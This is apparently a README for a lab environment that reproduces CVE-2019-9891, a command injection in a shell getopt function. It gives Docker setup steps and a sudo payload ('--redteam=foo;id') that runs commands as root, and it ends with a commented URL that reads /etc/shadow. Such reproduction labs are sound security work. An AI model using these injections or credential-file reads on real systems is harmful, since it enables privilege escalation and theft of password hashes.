# CVE-2019-9891

## About
* <https://nvd.nist.gov/vuln/detail/CVE-2019-9891>

## PoC / Exploit
* <https://www.redteam-pentesting.de/en/advisories/rt-sa-2019-007/-code-execution-via-insecure-shell-function-getopt-simple>
 

## Environment used

* Ubuntu 18.04.4 LTS

## Reproduction 

* Server
    - Docker version
        ```shell script
        docker build -t cve-2019-9891 . 
        docker run -p8022:22 -it cve-2019-9891
        ```
      
    - Script version
        ```shell script
        sudo bash installation.sh 
        ```    
* Client
    ```shell script
    bash login.sh
    ```
  After login run `sudo /usr/local/sbin/cleanup.sh '--redteam=foo;id'` and you'll see the result of *id* command as root.  



[comment]: <> (https://localhost:10000/file/show.cgi/etc/shadow)